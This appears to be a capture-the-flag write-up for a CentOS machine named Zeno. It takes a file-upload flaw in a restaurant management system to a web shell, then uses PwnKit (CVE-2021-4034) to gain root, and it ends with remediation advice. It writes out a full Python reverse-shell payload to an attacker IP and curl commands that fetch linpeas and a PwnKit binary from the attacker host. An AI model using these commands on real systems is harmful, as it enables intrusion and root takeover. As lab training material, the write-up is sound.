## Zeno

Linux machine running an old CentOS web server with a restaurant management system (RMS). A file upload flaw in the RMS gave a web shell as the Apache user. From there, a local privilege escalation using pkexec (CVE-2021-4034, PwnKit) gave root.

**Target:** 10.49.160.46 (zeno)
**Difficulty:** Medium
**Attack Path:** Port scan → Web app discovery → RMS file upload → Web shell → Reverse shell → Stabilize → Linux enumeration → PwnKit → Root

---

### PART 1: RECONNAISSANCE

**Why start with a port scan?** Each open port is a possible entry point. Mapping them first tells us where to focus.

**Full port scan**

```
nmap -p- 10.49.160.46
```

```
22/tcp     open   ssh      OpenSSH 7.4
12340/tcp  open   http     Apache 2.4.6 (CentOS), PHP 5.4.16
```

Port 22 is a normal SSH service. Port 12340 is an unusual port for a web server, and it is the main target.

**Service and version scan**

```
nmap -sV -sC -p 22,12340 10.49.160.46
```

The version details matter. Apache 2.4.6 with PHP 5.4.16 is very old (PHP 5.4 reached end of life in 2015), so known vulnerabilities are likely.

**Takeaway:** The web server on port 12340 is the best starting point.

---

### PART 2: WEB APPLICATION DISCOVERY

**Directory enumeration**

```
gobuster dir -u http://10.49.160.46:12340/ -w /usr/share/wordlists/dirb/common.txt
```

```
/rms    (Status: 301)
```

**What is /rms?** The notes identify it as a restaurant management system. A quick search confirms this is a known open-source PHP application, which means its public vulnerabilities can be looked up.

**Why this is useful:** Recognizing the application lets us search for known flaws instead of guessing blindly.

---

### PART 3: FILE UPLOAD EXPLOIT

**Finding a public exploit**

A public write-up describes a file upload weakness in this RMS application. The exploit script (`exp.py`) automates the attack. When it runs, the server confirms the upload:

```
Shell Uploaded. Please check the URL : http://10.49.160.46:12340/rms/images/reverse-shell.php
```

**What happened:** The application accepted a PHP file in the images upload path and saved it without checking the file type. Because the server runs PHP, the file executes when requested.

**Lesson:** Upload features must verify both the file extension and the file content. Saving a `.php` file into a web-accessible directory is almost always dangerous.

---

### PART 4: VERIFYING THE WEB SHELL

**Test with a harmless command**

```
curl -i "http://10.49.160.46:12340/rms/images/reverse-shell.php?cmd=id"
```

Response:

```
HTTP/1.1 200 OK
Server: Apache/2.4.6 (CentOS) PHP/5.4.16

uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

**What this shows:**
- The `?cmd=` parameter passes commands to the shell.
- Commands run as `apache` (uid 48), the web server user.
- The `context=` part is SELinux. The web process is confined to the `httpd_t` domain, which limits what it can do.

**Why use `curl` first?** A web shell is a fragile foothold. Testing with a simple command like `id` confirms it works before trying anything more complex.

---

### PART 5: REVERSE SHELL

A web shell lets us run one command per request. A reverse shell gives us an interactive session.

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Target: trigger a Python reverse shell through the web shell**

The payload is URL-encoded, so it can be sent in the `cmd` parameter. Decoded, it reads:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.136.69",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")'
```

**What this does:**
1. Opens a TCP connection to the attacker at 192.168.136.69, port 4444.
2. Redirects standard input, output, and error through that connection (`dup2`).
3. Starts a bash session with `pty.spawn`, which gives a more usable shell.

**Result:**

```
bash-4.2$
```

---

### PART 6: STABILIZING THE SHELL

A raw shell has no tab completion, no arrow keys, and Ctrl+C kills the session. The following steps fix that.

```
bash-4.2$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.2$ ^Z                        # Ctrl+Z to suspend the listener
┌──(root)-[...]
└─# stty raw -echo                  # Pass keystrokes through directly
└─# fg                              # Bring the listener back
bash-4.2$ export TERM=xterm         # Set terminal type for proper display
```

**Why it works:** `stty raw -echo` changes the attacker's terminal so that keystrokes go straight to the target. `export TERM=xterm` lets full-screen programs display correctly.

---

### PART 7: LOCAL ENUMERATION

**Problem:** The Apache user cannot read `user.txt` in `/home/edward`, so we need more access. The next step is to look for weaknesses on the system.

**Running linpeas**

Linpeas is an automated script that checks for common privilege escalation paths. It was uploaded from the attacker machine:

```
curl http://192.168.136.69/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Useful findings:**

Recent logins showed two real users on the machine:

```
root      tty1
edward    pts/0
```

Linpeas also flagged a SUID binary with a known vulnerability:

```
-rwsr-xr-x. 1 root root 23576 Apr  1  2020 /usr/bin/pkexec
pkexec version 0.112
Potentially vulnerable to CVE-2021-4034 (PwnKit)
```

**What is SUID?** A file with the SUID bit set runs with its owner's permissions. Here, `pkexec` is owned by root, so when any user runs it, the program runs as root. If it has a bug, the bug can be used to gain root.

---

### PART 8: PRIVILEGE ESCALATION (PWNKIT)

**The vulnerability**

CVE-2021-4034 (PwnKit) is a memory corruption bug in `pkexec`. It affects versions released before the 2022 patch. Any local user, including the unprivileged Apache user, can use it to run code as root.

**Download the exploit to the target**

```
curl http://192.168.136.69/PwnKit -o pwnkit
chmod +x pwnkit
```

**Run it**

```
./pwnkit
```

**Result:**

```
[root@zeno tmp]# whoami
root
[root@zeno tmp]# id
uid=0(root) gid=0(root) groups=0(root),48(apache) context=system_u:system_r:httpd_t:s0
```

Root access is confirmed.

---

### PART 9: FLAGS

**User flag**

With root access, we can read files in any user's home directory:

```
cd /home/edward
cat user.txt
```

Output: [user flag: not recorded in notes]

**Root flag**

```
cd /root
ls
cat root.txt
```

Files in `/root`:

```
anaconda-ks.cfg
bash_history
root.txt
zeno-monitoring.log
zeno-monitoring.py
```

Output: [root flag: not recorded in notes]

**Note:** The `/root` directory also contains `zeno-monitoring.py` and its log. These could be reviewed for any scheduled tasks or credentials, but they were not examined in the notes.

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Full port scan (22, 12340)
  ├─ Service and version detection
  └─ Identify old Apache/PHP on 12340

PHASE 2: Web Discovery
  └─ Find /rms (restaurant management system)

PHASE 3: Initial Access
  ├─ Run public upload exploit (exp.py)
  ├─ Web shell uploaded to /rms/images/
  └─ Verify with ?cmd=id (uid=48 apache)

PHASE 4: Foothold
  ├─ Python reverse shell to port 4444
  └─ Stabilize with pty and stty

PHASE 5: Enumeration
  ├─ Transfer and run linpeas
  ├─ Identify users: root, edward
  └─ Identify pkexec as CVE-2021-4034 candidate

PHASE 6: Privilege Escalation
  ├─ Download PwnKit exploit
  └─ Gain root

PHASE 7: Flags
  ├─ User flag in /home/edward
  └─ Root flag in /root
```

---

### VULNERABILITIES

1. **Unrestricted File Upload in RMS (Critical)**
   - PHP files accepted into a web-accessible directory
   - Enables remote code execution as the web user

2. **Outdated Software Stack (High)**
   - Apache 2.4.6 with PHP 5.4.16 (end of life)
   - Old packages increase exposure to known exploits

3. **Unpatched pkexec / CVE-2021-4034 (Critical)**
   - Any local user can gain root
   - Fixed in the January 2022 polkit update

4. **Web Process Able to Reach Shell Environment (Medium)**
   - Apache user can spawn a shell and run arbitrary commands

---

### REMEDIATION

```
├─ Validate uploads by content and extension; store outside the web root
├─ Block execution of PHP in upload and image directories
├─ Upgrade the RMS application and any dependent libraries
├─ Upgrade PHP and Apache to supported versions
├─ Apply the polkit security update that fixes CVE-2021-4034
├─ Remove unnecessary SUID binaries where possible
├─ Run the web service with minimal privileges and keep SELinux enforcing
└─ Monitor for new PHP files in image directories and unusual process creation
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- gobuster (directory discovery)
- Public exploit script exp.py (file upload)
- curl (web shell testing and file transfer)
- nc (reverse shell listener)
- linpeas (local enumeration)
- PwnKit (CVE-2021-4034 privilege escalation)

**Key Insight:** An upload feature that accepted PHP files gave a web shell. A vulnerable, unpatched `pkexec` then turned an unprivileged web user into root.

**Concepts to Study:**
- Unrestricted file upload vulnerabilities
- Web shells vs. reverse shells
- SUID binaries and how they are abused
- Shell stabilization techniques
- Patch management for system utilities

# JAI SHRI RAM
